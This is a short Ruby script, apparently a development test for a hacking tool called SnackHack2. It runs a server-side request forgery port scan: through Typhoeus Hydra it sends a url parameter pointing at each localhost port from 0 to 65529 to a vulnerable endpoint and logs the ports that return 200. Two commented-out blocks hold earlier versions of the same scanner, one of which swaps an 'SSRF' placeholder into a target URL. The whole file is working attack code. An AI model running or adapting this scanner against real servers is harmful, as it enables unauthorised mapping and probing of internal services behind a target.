# Purpose of this script is test stuff before 
# putting it in SnackHack2

require 'typhoeus'
require "colorize"
hydra = Typhoeus::Hydra.new
i = 0
found_ports = []
65530.times.each_with_index.map{ |i|
  request = Typhoeus::Request.new("http://127.0.0.1:10/?url=http://localhost:#{i}", followlocation: true)
  t = hydra.queue(request)
  request.on_complete do |response|
    if response.code.to_i.eql?(200)
      puts i
      puts "#{response.code}"
      found_ports << i
    end
  end
  #i+=1
}
hydra.run
p found_ports

=begin
i = 0
hydra = Typhoeus::Hydra.new
requests = 65530.times.map {
  i += 1
  request = Typhoeus::Request.new("www.example.com", followlocation: true)
  hydra.queue(request)
  request
}
hydra.run

responses = requests.map { |request|
  p request.response.code
  p i
}
=end
=begin
  found_ports = []
      ssrf_status = false
      # 6553
      for port in 8010..port_count.to_i
        site = @site.gsub("SSRF", "#{@ssrf_site}") + ":" + port.to_s
        puts site
        begin
          j = HTTParty.get(site)
          puts "Response code: #{j.code}"
          if j.code.to_i.eql?(200)
            found_ports << port
            ssrf_status = true
          end 
        rescue => e
          #puts "error: #{e}"
          ssrf_satus = false
        end
        port += 1
      end
    found_ports
=end